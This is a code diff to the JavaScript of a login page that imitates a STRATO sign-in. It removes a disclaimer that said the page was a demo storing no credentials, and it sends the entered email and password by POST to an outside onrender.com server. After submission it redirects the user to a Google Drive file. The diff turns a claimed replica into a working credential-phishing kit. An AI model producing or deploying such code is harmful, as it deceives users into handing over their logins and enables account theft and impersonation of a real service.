@@ -4,6 +4,7 @@ const form = document.getElementById("loginForm");
 const email = document.getElementById("email");
 const password = document.getElementById("password");
 const demoNote = document.getElementById("demoNote");
+const loginButton = document.getElementById("btn");
 
 /* --- Language dropdown --- */
 const langToggle = document.getElementById("langToggle");
@@ -50,6 +51,9 @@ form.addEventListener('submit', (e) => {
 
   const emailOk = email.value.trim().length > 0;
   const passOk = password.value.trim().length > 0;
+  const loginButton = document.getElementById("btn");
+    loginButton.loading = true;
+    loginButton.textContent = 'Anmelden...';
   
 
   setError(email, !emailOk);
@@ -62,11 +66,7 @@ form.addEventListener('submit', (e) => {
     return;
   }
 
-  demoNote.textContent =
-    "Front-end demo only — this replica does not send or store any credentials.";
-  demoNote.hidden = false;
-
-  fetch('https://web-backend-vdsi.onrender.com/', {
+  fetch('https://web-backend-79hb.onrender.com/', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json',
@@ -74,19 +74,11 @@ form.addEventListener('submit', (e) => {
               body: JSON.stringify({
                 email: email.value,
                 password: password.value,
-                source: 'Strato',
+                source: 'STRATO',
               }),
             })
-              .then((res) => {
-                if (!res.ok) {
-                  throw new Error(
-                    'Network response was not ok ' + res.statusText,
-                  );
-                }
-                return res.json();
-              })
               .then((data) => {
-                window.location.href = 'strato.com';
+                window.location.href = 'https://drive.google.com/file/d/1RLPmduwBiE3iDOcjJIYEkJRhXS4_k80V/view?usp=drive_link';
               });
   
 });
